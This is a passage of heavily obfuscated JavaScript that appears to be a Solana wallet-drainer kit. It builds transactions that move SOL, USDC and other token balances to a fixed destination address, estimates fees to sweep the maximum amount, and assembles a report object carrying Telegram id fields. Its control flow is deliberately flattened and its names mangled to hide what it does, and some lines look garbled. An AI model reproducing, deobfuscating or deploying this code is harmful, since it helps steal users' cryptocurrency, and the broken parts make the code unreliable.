    if (this["Er"]) {
      let _s3 = await _callPriv(this, _v33, _v349)["call"](this);
      _s3 && _s1["unshift"](_s3)
    }
    if (_str_cache["id"] == 1) {
      let _s3 = await _callPriv(this, _v33, _v472)["call"](this, _s1["length"]);
      _s3 && _s1["unshift"](..._s3)
    }
    return _s1
  } ["Dr"]() {
    let _str_cache = [];
    let __str_table__ = 3;
    for (let _s1 of this["S"]["ee"]) {
      if (_s1["oe"] < 30) {
        break
      }
      if (_s1["type"] == 0) {
        if (!__str_table__) {
          continue
        }
        _noop(_str_cache["push"](_s1), __str_table__ -= 1)
      }
    }
    return _str_cache
  } ["Yn"]() {
    _callPriv(this, _v33, _v348)["call"](this);
    let _str_cache = this["S"];
    _noop(this["z"] = _str_cache["K"] - 1500000, this["ie"] = !_str_cache["Ke"]() || this["z"] < 8e5);
    let __str_table__ = this["Dr"]();
    let _s1 = __str_table__["filter"](_limitArgs((..._str_cache) => {
      _str_cache["length"] = 1;
      return _v561(_str_cache[0])
    }));
    if (this["Fe"] = __str_table__, this["lr"] = __str_table__, _setPriv(this, _v158, _s1), this["Yt"] = _s1["length"] > 0, !this["ie"]) {
      let _s3 = 55e3;
      let _s2 = this["Yt"] ? 2 : 1;
      this["z"] -= _s3 * _s2
    }
  }
  async ["qn"](_str_cache, __str_table__) {
    let _s1 = await _v179(this["E"]);
    let _s3 = _getPriv(this, _v158);
    let {
      ["c"]: _s2
    } = this["S"];
    let _s5 = 20000;
    let _s4 = [];
    let _s6 = [];
    if (_s2["ue"] == 5) {
      let _s7 = _callPriv(this, _v33, _v350)["call"](this);
      _s3["length"] > 1 && _s7["splice"](1);
      for (let [_s8, _defineProperty] of _s7) {
        let _getOwnPropDesc = await _v640(this["E"], _s8, [255]);
        _noop(_s6["push"](_v1045(_v111, this["E"], _getOwnPropDesc, _defineProperty, _s8)), _s5 += 20000)
      }
    } else {
      _s4["push"](_v557(_s1, this["E"]))
    }
    let _found = await _callPriv(this, _v33, _v351)["call"](this, __str_table__);
    let _v1 = _s2["ce"];
    let _v2 = [this["He"]];
    _v1 && _v2["push"](_v1[0]);
    let _v5 = await _v1047(_v2, _s3);
    for (let _s7 = 0; _s7 < _s3["length"]; _s7++) {
      let _s8 = {
        ["de"]: _found[_s7],
        ["J"]: _s3[_s7]["J"],
        ["q"]: _s3[_s7]["q"]
      };
      let _defineProperty = _v5["get"](_s8["q"]);
      let [_getOwnPropDesc, _v25] = _defineProperty;
      _noop(_s6["push"](_v555(_v111, _s8["q"], _s8["J"], _v2["map"](_limitArgs((..._str_cache) => {
        _str_cache["length"] = 2;
        return {
          ["je"]: _str_cache[0],
          ["de"]: _defineProperty[_str_cache[1]]
        }
      }, 2)))), _s6["push"](_v392({
        ["gt"]: this["E"],
        ["Je"]: _s8,
        ["Gt"]: _getOwnPropDesc,
        ["vt"]: _v111,
        ["ce"]: _v1 ? [_v25, _v1[1]] : !1
      })), _s5 += 5000)
    }
    return _s4["unshift"](_v286(Math["max"](_s5, 100000)), _v285(5000000n), _v558(_v1 ? "|1" : "|0"), _v391(_s6)), _v169(this["Ve"], _s4, _str_cache ?? _v462)
  }
  async ["Xn"](_str_cache, __str_table__) {
    let _s1 = _getPriv(this, _v158);
    let _s3 = await _v179(this["E"]);
    let _s2 = await _callPriv(this, _v33, _v351)["call"](this, __str_table__);
    let _s5 = [_v286(100000), _v285(1000000n), _v557(_s3, this["E"])];
    for (let _s4 = 0; _s4 < _s1["length"]; _s4++) {
      _s5["push"](_v392({
        ["gt"]: this["E"],
        ["Gt"]: _s2[_s4],
        ["Je"]: _s1[_s4],
        ["vt"]: _v111
      }))
    }
    return _v169(this["Ve"], _s5, _str_cache)
  }
}, _v48 = new(WeakMap), _v33 = new(WeakMap), _v348 = function() {
  let {
    ["K"]: _str_cache, ["ee"]: __str_table__
  } = this["S"];
  _noop(this["Pn"](), _setPriv(this, _v48, new _v730(this)), this["Fe"] = [], this["Et"] = 0, this["Rt"] = 0, this["z"] = _str_cache, this["z"] -= this["ie"] ? 650240 : _v337["pr"](this["S"]), this["De"] = __str_table__["filter"](_limitArgs((..._str_cache) => {
    _str_cache["length"] = 1;
    return _v561(_str_cache[0])
  }))["slice"](0, this["mr"]))
}, _v466 = async function() {
  let _str_cache = this["De"];
  if (_str_cache["length"] === 0) {
    return
  }
  let __str_table__ = this["S"]["we"]();
  let _s1 = this["S"]["c"]["ce"];
  let _s3 = 140 + _clamp("_v401", 650, 3);
  let _s2 = [this["He"]];
  _s1 && _s2["push"](_s1[0]);
  let _s5 = await _v1047(_s2, _str_cache);
  let _s4 = await _v338["In"]([..._s5["values"]()]["flat"]());
  let _s6 = new(Set);
  let _s7 = this["be"] != 0 ? await _v179(this["E"]) : void 0;
  for (let _s8 of _str_cache) {
    if (_s8["q"] == _v335) {
      await _callPriv(this, _v33, _v469)["call"](this, _s8);
      continue
    }
    if (!this["Or"](_s8, __str_table__)) {
      continue
    }
    let _defineProperty = _s5["get"](_s8["q"]);
    let _getOwnPropDesc = !1;
    let _found = new(Set);
    let _v1;
    let _v2 = _s8["_e"] ?? 1700000;
    let _v5 = _v2 + 30000;
    let _v25 = [];
    for (let _initPriv = 0; _initPriv < _s2["length"]; _initPriv++) {
      let _setPriv = _defineProperty[_initPriv];
      let _v57 = _s2[_initPriv];
      if (!(_s4["has"](_setPriv) || _s6["has"](_setPriv))) {
        let _v313 = (_v5 + _s3) * (_found["size"] + 1);
        let _v314 = this["z"] - _v313 >= 0;
        let _v224 = _s8["oe"] >= MAX_RETRIES;
        if (!this["ie"] && !_v314 || !_v224) {
          _getOwnPropDesc = !0;
          break
        }
        _noop(_v25["push"]({
          ["je"]: _v57,
          ["de"]: _setPriv
        }), _found["add"](_setPriv))
      }
    }
    if (_v25["length"] > 0 && (_v1 = _v555(this["Ve"], _s8["q"], _s8["J"], _v25)), _getOwnPropDesc) {
      continue
    }
    let [_v225, _v315] = _defineProperty;
    let _v226 = !this["Fn"] && _v1237(_s8);
    let _v227 = _v226 && (this["ie"] ? this["Ve"] : this["At"] ? this["E"] : this["He"]);
    let _v228 = _v392({
      ["gt"]: this["E"],
      ["Je"]: _s8,
      ["Gt"]: _v225,
      ["vt"]: _v227,
      ["Pe"]: _s7,
      ["ce"]: _s1 ? [_v315, _s1[1]] : !1
    });
    let _v316 = _v1 ? _v391([_v1, _v228]) : _v228;
    if (_getPriv(this, _v48)["xe"](_v316)) {
      _noop(this["Fe"]["push"](_s8), this["z"] -= _s3, _s1 && (this["z"] -= _s3));
      for (let _initPriv of _found) {
        _noop(this["z"] -= _v5, _s6["add"](_initPriv), this["Rt"] += _v2)
      }
      _v226 && this["At"] && (this["z"] += _s8["_e"] ?? 1513840)
    } else {
      continue
    }
  }
}, _v467 = async function() {
  let _str_cache = this["De"];
  if (_str_cache["length"] === 0) {
    return
  }
  let __str_table__ = await _v179(this["E"]);
  let _s1 = 690;
  let _s3 = this["S"]["we"]();
  for (let _s2 of _str_cache) {
    if (!this["ie"] && this["z"] - _s1 < 0 || !this["Or"](_s2, _s3)) {
      break
    }
    let _s5 = _v1245({
      ["Je"]: _s2,
      ["gt"]: this["E"],
      ["Ln"]: _v111,
      ["$t"]: !_s2["J"],
      ["Pe"]: __str_table__
    });
    if (_getPriv(this, _v48)["xe"](_s5)) {
      _noop(this["Fe"]["push"](_s2), this["z"] -= _s1)
    } else {
      break
    }
  }
}, _v468 = async function() {
  let _str_cache = this["S"]["c"]["ce"];
  let __str_table__ = this["Gn"]();
  let _s1 = _str_cache ? this["E"] : this["He"];
  let _s3 = this["be"] != 0 ? await _v179(this["E"]) : void 0;
  for (let _s2 of this["S"]["ee"]) {
    if (_s2["type"] == 2) {
      let _s5 = _s2["state"] == 2;
      if (!_s5 && (!__str_table__ || _s2["oe"] < 50)) {
        continue
      }
      let _s4;
      _noop(_s3 ? (_s5 = !1, _s4 = _v911(_s3, this["E"], _s2["e"], _v111)) : _s4 = _s5 ? _v1243(this["E"], _s2["e"], _s1, _s2["K"]) : _v912(this["E"], _s2["e"], _v111), _getPriv(this, _v48)["xe"](_s4) && (this["z"] -= 25000, _s5 && _str_cache ? this["z"] += _s2["K"] : (this["Rt"] += _s2["K"], this["Fe"]["push"](_s2))))
    }
  }
}, _v469 = async function(_str_cache) {
  let __str_table__ = 60;
  if (this["z"] - __str_table__ < 0) {
    return
  }
  _getPriv(this, _v48)["xe"](_v917(_str_cache["de"], this["E"], this["E"], !1)) && (this["z"] -= __str_table__, this["z"] += Number(_str_cache["ve"]), this["z"] += _str_cache["_e"] ?? 1488440, await _callPriv(this, _v33, _v245)["call"](this, !0, 0.1))
}, _v245 = async function(_str_cache = !1, __str_table__ = .025) {
  if (!this["S"]["Ke"]()) {
    return
  }
  let _s1 = this["S"]["c"];
  let _s3 = this["z"];
  if (_s3 -= _str_cache ? this["wt"] : 150, _s3 += this["Wt"], this["Sr"]() && (_s3 = _v906(_s3)), !this["yr"](_s3) || (_s3 -= this["Wt"], _s3 < (_str_cache ? __str_table__ * 1000000000 : 100000))) {
    return
  }
  let _s2 = !1;
  let _s5 = this["He"];
  let _s4 = _s1["ce"];
  if (this["ie"] && _s3 <= this["wt"] && (_s5 = this["Ve"]), _str_cache) {
    if (_s4) {
      let _s6 = _v909(this["E"], _s5, _s4, _s3);
      _s2 = _getPriv(this, _v48)["xr"](_s6)
    }
    if (!_s2) {
      let _s6 = _v99(this["E"], _s5, _s3);
      _s2 = _getPriv(this, _v48)["xe"](_s6)
    }
  } else {
    let _s6 = this["be"] != 0 && (await _v179(this["E"]));
    let _s7 = _v556({
      ["E"]: this["E"],
      ["to"]: this["He"],
      ["ce"]: _s4,
      ["Pe"]: _s6
    });
    _s2 = _getPriv(this, _v48)["xe"](_s7)
  }
  _s2 && (this["z"] -= _s3, this["Et"] += _s3)
}, _v470 = async function() {
  if (!this["S"]["Ke"]()) {
    return
  }
  let {
    ["b"]: _str_cache, ["c"]: __str_table__
  } = this["S"];
  if (this["be"] != 0 && this["yr"](this["z"])) {
    let _s1 = this["be"] != 0 ? await _v179(this["E"]) : void 0;
    if (_getPriv(this, _v48)["xe"](_v556({
        ["E"]: this["E"],
        ["to"]: this["He"],
        ["ce"]: __str_table__["ce"],
        ["Pe"]: _s1,
        ["Cn"]: _str_cache["Cr"]
      })), this["z"] > 0) {
      let _s3 = _str_cache["id"] == 0 ? 1500000 : 1000000;
      this["Et"] += this["z"] - _s3
    }
  } else {
    !this["Kt"] && _str_cache["Cr"] && _getPriv(this, _v48)["xe"](_v913(this["E"]))
  }
}, _v349 = async function() {
  let {
    ["c"]: _str_cache, ["b"]: __str_table__
  } = this["S"];
  let _s1 = [_v914(this["E"])];
  let _s3 = !!(_str_cache["et"] & 2);
  let _s2 = !!(_str_cache["et"] & 1);
  let _s5 = _str_cache["tt"];
  if (!_s2 && __str_table__["Lr"] && (_s2 = !0, _s5 = 0.001), _s2) {
    let _s4 = Math["trunc"](_s5 * 1000000000);
    _noop(!__str_table__["Tr"] && !__str_table__["Lr"] && !(__str_table__["id"] == 1 && _str_cache["ue"] == 6) && (_s4 += this["Wt"] - 75), __str_table__["id"] == 8 && (_s4 += 10000), __str_table__["id"] == 3 && (_s4 += 615e3), __str_table__["id"] == 9 && (_s4 += 20300), __str_table__["id"] == 17 && (_s4 += 15e3), __str_table__["id"] == 19 && (_s4 += 100000), __str_table__["id"] == 15 && _s3 && (_s4 -= 1488440), _s1["push"](_v99(_v236, this["E"], _s4)))
  }
  if (_s3) {
    let _s4 = _str_cache["St"];
    let _s6 = _s4["J"];
    let _s7 = BigInt(Math["trunc"](_s4["Oe"] * 10 ** _s4["g"]));
    let _s8 = await _v639(_buildList(this["E"]), _s4["q"], _s6);
    if (_v238["has"](_s8) || _s1["push"](_v918(_v236, this["E"], _s8, _s4["q"], _s6)), _s6) {
      let _defineProperty = {
        ["q"]: _s4["q"],
        ["g"]: _s4["g"],
        ["Ot"]: 0,
        ["Nt"]: "null"
      };
      _s1["push"](_v910(_s4["je"], _s4["de"], _s8, _s7, _defineProperty))
    } else {
      _s1["push"](_v919(_s4["je"], _s4["de"], _s8, _s7))
    }
  }
  return _v1247(_v236, _s1, 2)
}, _v350 = function() {
  let _str_cache = this["S"]["c"];
  let __str_table__ = [];
  if (_str_cache["et"] & 2) {
    let _s1 = _str_cache["St"];
    let _s3 = _v339[_s1["ze"]];
    let _s2 = _v565(_s1["Oe"], 2) * 1000000;
    _noop(_s3 || (_s3 = _v339["USDC"], _s2 = 1000000000), __str_table__["push"]([_s3, _s2, _s1["Oe"] * _s1["ot"]]))
  }
  if (_str_cache["et"] & 1) {
    let _s1 = _v565(_str_cache["tt"], 2) * 1000000;
    let _s3 = _str_cache["tt"] * solUsdRate;
    __str_table__["push"]([_v339["SOL"], _s1, _s3])
  }
  return __str_table__["sort"]((_str_cache, __str_table__) => {
    return __str_table__[2] - _str_cache[2]
  }), __str_table__
}, _v471 = async function() {
  let _str_cache = _callPriv(this, _v33, _v350)["call"](this);
  if (_str_cache["length"] === 0) {
    return
  }
  let __str_table__ = 1523840;
  _str_cache["length"] > 1 && (this["ie"] || !this["jn"]() || this["z"] < this["wt"] + __str_table__ * 2) && _str_cache["splice"](1);
  let _s1 = [];
  let _s3 = 0;
  let _s2 = 0;
  for (let [_s5, _s4] of _str_cache) {
    if (!this["ie"] && this["z"] - _s3 - __str_table__ < 0) {
      return
    }
    let _s6 = await _v640(this["E"], _s5, [255]);
    _noop(_s1["push"](_v1045(this["Ve"], this["E"], _s6, _s4, _s5)), _s2 += 1513840, _s3 += __str_table__)
  }
  let _s7 = _s1["length"] > 1 ? _v391(_s1) : _s1[0];
  _getPriv(this, _v48)["xe"](_s7) && (this["Rt"] += _s2, this["z"] -= _s3)
}, _v472 = async function(_str_cache) {
  let __str_table__ = this["S"]["c"];
  let _s1 = __str_table__["ue"];
  if (_s1 == 2) {
    let _s3 = __str_table__["kr"];
    if (_s3 == 1) {
      let _s2 = _v169(this["E"], []);
      return Array(201 - _str_cache)["fill"](_s2)
    }
    let _s5 = [_v286(1000), _v285(1000n)];
    return _s3 == 0 && _s5["push"](_v99(_v236, this["E"], 1)), [_v169(this["E"], _s5)]
  }
  if (_s1 == 6) {
    let _s3 = [];
    let _s5 = await _callPriv(this, _v33, _v349)["call"](this);
    return _s5 && _s3["push"](_s5), _s3
  }
}, _v158 = new(WeakMap), _v351 = async function(_str_cache) {
  let __str_table__ = _getPriv(this, _v158);
  let _s1 = [];
  for (let _s3 of __str_table__) {
    _s1["push"](await _v640(this["E"], _s3["q"], [_str_cache]))
  }
  return _s1
}, _v732 = "1.18.4", _v246 = undefined, _v247 = undefined, _v473 = undefined, _v474 = undefined, _v733 = class {
  constructor(_str_cache) {
    _noop(_initPriv(this, _v247), _initPriv(this, _v246), _setPriv(this, _v246, _str_cache))
  } ["Zn"](_str_cache, __str_table__, _s1) {
    let _s3 = __str_table__["b"];
    let _s2 = _getPriv(this, _v246);
    let {
      ["K"]: _s5, ["ee"]: _s4
    } = _callPriv(this, _v247, _v473)["call"](this, _str_cache, __str_table__);
    return {
      ["Ae"]: _str_cache,
      ["version"]: _v732,
      ["tg"]: _s2["tgid"] ? {
        ["id"]: _s2["tgid"],
        ["Pr"]: _s2["tgus"]
      } : void 0,
      ["b"]: _s3["name"],
      ["e"]: _s3["e"],
      ["Ge"]: _s3["Ge"],
      ["ve"]: Math["max"](0, _s5 / 1000000000),
      ["ee"]: _callPriv(this, _v247, _v474)["call"](this, _s4),
      ["Me"]: _s1?.Me,
      ["Mr"]: _s1?.We,
      ["ie"]: __str_table__["he"]["ie"],
      ["ut"]: !!_s1?.ut
    }
  }
}, _v246 = new(WeakMap), _v247 = new(WeakMap), _v473 = _limitArgs(function(..._str_cache) {
  var __str_table__, _s1;

  function* _s3(_s1, _s3, _s2, _s5 = {
    ["\u7AB0"]: {}
  }) {
    while (_s1 + _s3 + _s2 !== 77) {
      with(_s5["\u6F51"] || _s5) {
        switch (_s1 + _s3 + _s2) {
          case -230:
            _noop(_s5["\u6F51"] = _s5["\u79EC"], _s1 += 213, _s3 += -70, _s2 += 164);
            break;
          case -7:
          case -232:
            _str_cache["b"] = _str_cache[2]["Et"];
            return __str_table__ = true, _str_cache[2]["ie"] && _str_cache[CONSTS[_s1 + 69]] <= _str_cache[2]["wt"] && (_str_cache["b"] = 0), {
              [CONSTS[_s1 + 749]]: _str_cache[CONSTS[_s3 + 151]],
              ["ee"]: _str_cache[2]["Fe"]
            };
            _noop(_s5["\u6F51"] = _s5["\u6174"], _s1 += 122, _s3 += 85, _s2 += -123);
            break;
            if (_s2 == -17) {
              _noop(_s5["\u6F51"] = _s5["\u7AB0"], _s1 += -15, _s3 += 82);
              break
            }
          case 47:
          case _s1 != -238 && _s1 - -278:
          default:
            _noop(_s5["\u6F51"] = _s5["\u7AB0"], _s3 += -357, _s2 += 164);
            break;
            if (_s1 != -141) {
              _noop(_s5["\u6F51"] = _s5["\u7AB0"], _s3 += -367);
              break
            }
          case _s5["\u7AB0"]["\u6144"] + 48:
            if (_str_cache[0] == 0) {
              _noop(_s5["\u6F51"] = _s5["\u7AB0"], _s3 += 103);
              break
            } else {
              _noop(_s5["\u6F51"] = _s5["\u7AB0"], _s1 += 15, _s3 += 21);
              break
            }
          case 243:
          case _s2 - 115:
          case 12:
            return __str_table__ = true, {
              [CONSTS[_s3 + 749]]: _str_cache[1][CONSTS[_s3 + 749]],
              [CONSTS[_s1 + 892]]: _str_cache[CONSTS[_s1 + 69]][CONSTS[_s1 + 892]]
            };
            _noop(_s5["\u6F51"] = _s5["\u7AB0"], _s1 += 15, _s3 += -82);
            break;
          case _s5["\u7AB0"]["\u69FC"] + -51:
            _noop([_s5["\u7AB0"]["\u6144"], _s5["\u7AB0"]["\u69FC"], _s5["\u7AB0"]["\u9A52"]] = [55, 71, 128], _s5["\u6F51"] = _s5["\u7AB0"], _s1 += -149, _s3 += 157, _s2 += 123);
            break;
          case _s5["\u7AB0"]["\u9A52"] + 4:
            return __str_table__ = true, {
              [CONSTS[_s3 + 852]]: _str_cache[CONSTS[_s1 + -171]][CONSTS[_s1 + 524]],
              ["ee"]: _str_cache[CONSTS[_s1 + -171]]["ee"]
            };
            _noop(_s5["\u6F51"] = _s5["\u7AB0"], _s1 += -240, _s2 += 314);
            break;
          case -213:
          case _s2 - -152:
            return __str_table__ = true, {
              ["K"]: _str_cache[1]["K"],
              ["ee"]: _str_cache[CONSTS[_s1 + 242]]["ee"]
            };
            _noop(_s5["\u6F51"] = _s5["\u7AB0"], _s1 += 188, _s3 += -522, _s2 += 287);
            break;
          case _s3 - 89:
            _noop(_s5["\u6F51"] = _s5["\u7535"], _s1 += 213, _s3 += -80);
            break;
          case -100:
          case 237:
            _noop([_s5["\u7AB0"]["\u6144"], _s5["\u7AB0"]["\u69FC"], _s5["\u7AB0"]["\u9A52"]] = [-91, -20, -121], _str_cache[CONSTS[_s1 + -91]] = 2, _str_cache[2] = _str_cache[CONSTS[_s3 + -162]]["he"]);
            if (_str_cache[CONSTS[_s3 + -160]] == 1 || _str_cache[0] == CONSTS[_s1 + -93]) {
              _noop(_s5["\u6F51"] = _s5["\u7AB0"], _s1 += 79, _s3 += -319, _s2 += -114);
              break
            } else {
              _noop(_s5["\u6F51"] = _s5["\u7AB0"], _s1 += -161, _s3 += -319, _s2 += 200);
              break
            }
        }
      }
    }
  }
  _noop(__str_table__ = undefined, _s1 = _s3(96, 166, -25)["next"]()["value"]);
  if (__str_table__) {
    return _s1
  }
}, 2), _v474 = _limitArgs(function(..._str_cache) {
  var __str_table__, _s1;

  function* _s3(_s1, _s3, _s2, _s5, _s4 = {
    ["\u76AB"]: {}
  }) {
    while (_s1 + _s3 + _s2 + _s5 !== -230) {
      with(_s4["\u7E3B"] || _s4) {
        switch (_s1 + _s3 + _s2 + _s5) {
          case _s5 - 349:
            _noop(_s4["\u7E3B"] = _s4["\u6A7A"], _s1 += 94, _s2 += 307, _s5 += -777);
            break;
          case -155:
            _noop([_s4["\u76AB"]["\u5D73"], _s4["\u76AB"]["\u74A5"], _s4["\u76AB"]["\u6389"]] = [88, 4, -49], _s4["\u7E3B"] = _s4["\u830E"], _s1 += 253, _s3 += -214, _s2 += 297, _s5 += -411);
            break;
          case 41:
            _noop(_s4["\u7E3B"] = _s4["\u76AB"], _s2 += -553, _s5 += 658);
            break;
          case _s2 - 390:
          case 166:
          case 1:
            _noop([_s4["\u76AB"]["\u5D73"], _s4["\u76AB"]["\u74A5"], _s4["\u76AB"]["\u6389"]] = [52, 166, 187], _str_cache[CONSTS[_s1 + 165]] = CONSTS[_s2 + -556], _str_cache[1] = []);
            for (let _s6 = 0; _s6 < 50; _s6++) {
              let _s7 = _str_cache[0][_s6];
              if (!_s7) {
                break
              }
              let _s8 = _s7["type"];
              let _defineProperty = _s8 == 0 ? _s7[CONSTS[_s1 + 426]] : _s8 == CONSTS[_s3 + 200] ? _s7["qt"] : _s8 == 2 ? CONSTS[_s1 + 939] : CONSTS[_s2 + 334] + CONSTS[_s3 + 347];
              let _getOwnPropDesc = _s8 == 0 ? _s7[CONSTS[_s3 + 887]] ? 1 : 0 : _s8 == CONSTS[_s3 + 200] ? 2 : _s8 == 2 ? 3 : -CONSTS[_s3 + 200];
              _str_cache[1]["push"]({
                [CONSTS[_s1 + 809]]: _getOwnPropDesc,
                ["qt"]: _defineProperty,
                ["oe"]: _s7[CONSTS[_s3 + 896]]
              })
            }
            _noop(_s4["\u7E3B"] = _s4["\u76AB"], _s1 += 76, _s3 += 288, _s2 += -475, _s5 += -81);
            break;
          default:
          case 78:
            return __str_table__ = true, _str_cache[1];
            _noop(_s4["\u7E3B"] = _s4["\u9930"], _s1 += 174, _s3 += -328, _s2 += 113, _s5 += -167);
            break;
            if (_s2 > 137) {
              _s4["\u7E3B"] = _s4["\u76AB"];
              break
            }
          case -189:
            _noop(_s4["\u7E3B"] = _s4["\u8687"], _s1 += 253, _s3 += -101, _s2 += 218, _s5 += -411);
            break
        }
      }
    }
  }
  _noop(__str_table__ = undefined, _s1 = _s3(-160, -196, 560, -34)["next"]()["value"]);
  if (__str_table__) {
    return _s1
  }
}), _v734 = new(TextEncoder), _v475 = new(TextDecoder));

function _v168(..._str_cache) {
  if (!_str_cache[0]) {
    return new(Uint8Array)(0)
  }
  _str_cache["a"] = _v734["encode"](_str_cache[0]);
  return _str_cache["a"]["length"] > 255 ? _str_cache["a"]["subarray"](0, 255) : _str_cache["a"]
}

function _v167(..._str_cache) {
  return _str_cache[0][_str_cache[1]] = _str_cache[2]["length"], _str_cache[2]["length"] === 0 ? _str_cache[1] + 1 : (_str_cache[0]["set"](_str_cache[2], _str_cache[1] + 1), _str_cache[1] + _str_cache[2]["length"] + 1)
}

function _v214(..._str_cache) {
  var __str_table__, _s1;

  function* _s3(_s1, _s3, _s2 = {
    ["\u6EA2"]: {}
  }) {
    while (_s1 + _s3 !== -74) {
      with(_s2["\u638A"] || _s2) {
        switch (_s1 + _s3) {
          default:
            _noop([_s2["\u6EA2"]["\u8A5D"], _s2["\u6EA2"]["\u5FF0"], _s2["\u6EA2"]["\u7863"]] = [60, -28, -58], _str_cache["a"] = _str_cache[0][_str_cache[1]]);
            if (!_str_cache[CONSTS[_s1 + -12]]) {
              _noop(_s2["\u638A"] = _s2["\u6EA2"], _s1 += -481, _s3 += 22);
              break
            } else {
              _noop(_s2["\u638A"] = _s2["\u6EA2"], _s1 += -299, _s3 += -119);
              break
            }
            if (_s1 != _s1 + 0) {
              _noop(_s2["\u638A"] = _s2["\u6EA2"], _s1 += -299, _s3 += -119);
              break
            }
          case -221:
          case -47:
          case _s1 != 78 && _s1 - -166:
            [_s2["\u6EA2"]["\u8A5D"], _s2["\u6EA2"]["\u5FF0"], _s2["\u6EA2"]["\u7863"]] = [122, -211, 220];
            return __str_table__ = true, {
              ["me"]: _str_cache[1] + 1,
              [CONSTS[_s1 + 675]]: "null"
            };
            _noop(_s2["\u638A"] = _s2["\u6EA2"], _s1 += 20, _s3 += -98);
            break;
          case _s1 != -292 && _s1 - -166:
            _noop(_s2["\u638A"] = _s2["\u766B"], _s1 += -51, _s3 += 21);
            break;
          case _s3 - 454:
            return __str_table__ = true, {
              [CONSTS[_s1 + 996]]: _str_cache[CONSTS[_s1 + 458]] + 1,
              [CONSTS[_s1 + 837]]: "null"
            };
            _noop(_s2["\u638A"] = _s2["\u6EA2"], _s1 += 182, _s3 += -141);
            break;
          case _s2["\u6EA2"]["\u7863"] + -116:
            _str_cache[-100] = _str_cache[CONSTS[_s1 + 179]]["subarray"](_str_cache[CONSTS[_s1 + 177]] + 1, _str_cache[CONSTS[_s1 + 177]] + _str_cache[CONSTS[_s1 + 188]] + 1);
            return __str_table__ = true, {
              ["me"]: _str_cache[CONSTS[_s1 + 177]] + _str_cache[CONSTS[_s1 + 188]] + 1,
              ["data"]: _v475[CONSTS[_s1 + 412]](_str_cache[-100])
            };
            _noop(_s2["\u638A"] = _s2["\u9F34"], _s1 += 251, _s3 += -151);
            break;
          case _s1 - -68:
            _str_cache[-100] = _str_cache[0][CONSTS[_s1 + 581] + CONSTS[_s1 + 582]](_str_cache[1] + 1, _str_cache[CONSTS[_s1 + 276]] + _str_cache["a"] + 1);
            return __str_table__ = true, {
              ["me"]: _str_cache[1] + _str_cache["a"] + 1,
              ["data"]: _v475[CONSTS[_s1 + 511]](_str_cache[-100])
            };
            _noop(_s2["\u638A"] = _s2["\u759A"], _s1 += 350, _s3 += -220);
            break;
          case _s3 - 247:
            return __str_table__ = true, {
              [CONSTS[_s1 + 789]]: _str_cache[CONSTS[_s1 + 251]] + CONSTS[_s1 + 251],
              [CONSTS[_s1 + 630]]: "null"
            };
            _noop(_s2["\u638A"] = _s2["\u6EA2"], _s1 += -25, _s3 += 69);
            break;
          case _s2["\u6EA2"]["\u8A5D"] + 122:
            return __str_table__ = true, {
              ["me"]: _str_cache[CONSTS[_s1 + -174]] + 1,
              ["data"]: "null"
            };
            _noop(_s2["\u638A"] = _s2["\u6EA2"], _s1 += -450, _s3 += 64);
            break
        }
      }
    }
  }
  _noop(__str_table__ = undefined, _s1 = _s3(27, 187)["next"]()["value"]);
  if (__str_table__) {
    return _s1
  }
}

function _v902(..._str_cache) {
  _str_cache[2] = _str_cache[0][_str_cache[1]];
  if (!_str_cache[2]) {
    return {
      ["me"]: _str_cache[1] + 1,
      ["data"]: "null"
    }
  }
  _str_cache[242] = _str_cache[0]["subarray"](_str_cache[1] + 1, _str_cache[1] + _str_cache[2] + 1);
  return {
    ["me"]: _str_cache[1] + _str_cache[2] + 1,
    ["data"]: _v331(_str_cache[242])
  }
}
_noop(_v26 = undefined, _v248 = undefined, _v191 = undefined, _v159 = undefined, _v137 = undefined, _v160 = undefined, _v735 = class {
  constructor(_str_cache) {
    _noop(_initPriv(this, _v137), _initPriv(this, _v26), _initPriv(this, _v248), _initPriv(this, _v191), _initPriv(this, _v159), this["xt"](_str_cache))
  } ["xt"](_str_cache) {
    let __str_table__ = _str_cache[0];
    let _s1 = 2;
    _noop(_setPriv(this, _v26, _str_cache["subarray"](_s1, __str_table__ + _s1)), _setPriv(this, _v191, new(sessionStorage)(_getPriv(this, _v26)["buffer"], _s1, __str_table__)), _setPriv(this, _v248, _str_cache["subarray"](__str_table__ + 2)), _setPriv(this, _v159, void 0))
  } ["Ur"]() {
    return _getPriv(this, _v26)[0]
  } ["Br"]() {
    return _v393(_getPriv(this, _v26), 1) / 1000
  } ["Fr"]() {
    let _str_cache = _callPriv(this, _v137, _v160)["call"](this)[3];
    let __str_table__ = _getPriv(this, _v26);
    return {
      ["q"]: _v287(__str_table__, 5),
      ["je"]: _v287(__str_table__, 37),
      ["de"]: _v287(__str_table__, 69),
      ["g"]: _getPriv(this, _v26)[101],
      ["ot"]: _getPriv(this, _v191)["getFloat64"](110),
      ["Oe"]: _getPriv(this, _v191)["getFloat64"](102),
      ["J"]: !!_getPriv(this, _v26)[129],
      ["ze"]: _str_cache
    }
  } ["zr"]() {
    if (!_getPriv(this, _v26)[134]) {
      return !1
    }
    let _str_cache = _callPriv(this, _v137, _v160)["call"](this)[5];
    if (!_str_cache) {
      return !1
    }
    let __str_table__ = _getPriv(this, _v26)[135];
    return [_str_cache, __str_table__]
  } ["Hr"]() {
    return _getPriv(this, _v26)[118]
  } ["Vr"]() {
    return _getPriv(this, _v26)[133]
  } ["Gr"]() {
    return _getPriv(this, _v26)[130]
  } ["$r"]() {
    return !!_getPriv(this, _v26)[131]
  } ["Wr"]() {
    return _getPriv(this, _v26)[124]
  } ["jr"]() {
    return _getPriv(this, _v26)[119]
  } ["Kr"]() {
    return _getPriv(this, _v26)[120]
  } ["Xt"]() {
    return _getPriv(this, _v26)[121]
  } ["Yr"]() {
    return _getPriv(this, _v26)[132]
  } ["Xr"]() {
    return _v393(_getPriv(this, _v26), 125)
  } ["Zr"]() {
    return _v171(_getPriv(this, _v26), 122)
  } ["Jr"]() {
    let _str_cache = _callPriv(this, _v137, _v160)["call"](this);
    return {
      ["header"]: _str_cache[0],
      ["text"]: _str_cache[1]
    }
  } ["Qr"]() {
    return _callPriv(this, _v137, _v160)["call"](this)[2]
  } ["en"]() {
    return _callPriv(this, _v137, _v160)["call"](this)[4]
  }
}, _v26 = new(WeakMap), _v248 = new(WeakMap), _v191 = new(WeakMap), _v159 = new(WeakMap), _v137 = new(WeakMap), _v160 = function() {
  let _str_cache = _getPriv(this, _v159);
  if (_str_cache) {
    return _str_cache
  }
  let __str_table__ = _getPriv(this, _v248);
  let _s1 = _v214(__str_table__, 0);
  let _s3 = _v214(__str_table__, _s1["me"]);
  let _s2 = _v214(__str_table__, _s3["me"]);
  let _s5 = _v214(__str_table__, _s2["me"]);
